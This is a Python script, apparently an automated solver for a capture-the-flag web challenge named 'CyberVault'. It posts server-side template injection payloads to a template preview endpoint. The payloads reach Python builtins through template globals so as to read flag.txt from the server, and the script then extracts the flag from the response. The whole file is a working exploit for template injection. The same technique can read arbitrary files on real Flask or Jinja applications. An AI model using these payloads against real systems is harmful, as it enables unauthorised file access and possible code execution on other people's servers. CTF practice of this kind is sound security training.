#!/usr/bin/env python3
"""
CyberVault SSTI Exploit Solver Script
CTF Web Challenge Automated Solution (Pure Python Stdlib)
"""
import sys
import re
import urllib.request
import urllib.parse

def solve(target_url):
    base_url = target_url.rstrip('/')
    if not base_url.endswith('/ssti'):
        preview_endpoint = f"{base_url}/ssti/preview"
    else:
        preview_endpoint = f"{base_url}/preview"
    
    ssti_payloads = [
        "{{ self.__init__.__globals__.__builtins__.open('flag.txt').read() }}",
        "{{ self.__init__.__globals__.__builtins__.open('/flag.txt').read() }}"
    ]
    
    for ssti_payload in ssti_payloads:
        data = urllib.parse.urlencode({
            'report_name': 'Exploit Test',
            'auditor': 'Hacker',
            'status': 'PASSED',
            'summary': 'Testing SSTI Payload',
            'template': f'<div class="exploit-flag">FLAG: {ssti_payload}</div>'
        }).encode('utf-8')
        
        req = urllib.request.Request(
            preview_endpoint,
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        
        print(f"[*] Sending payload to {preview_endpoint}...")
        try:
            with urllib.request.urlopen(req, timeout=5) as response:
                html = response.read().decode('utf-8')
                flag_match = re.search(r'CTF\{[A-Za-z0-9_]+\}', html)
                if flag_match:
                    print(f"[+] SUCCESS! Found Flag: \033[92m{flag_match.group(0)}\033[0m")
                    return True
        except Exception as e:
            print(f"[-] Request error: {e}")
            
    print("[-] Flag pattern was not found in response.")
    return False

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8001"
    success = solve(url)
    sys.exit(0 if success else 1)
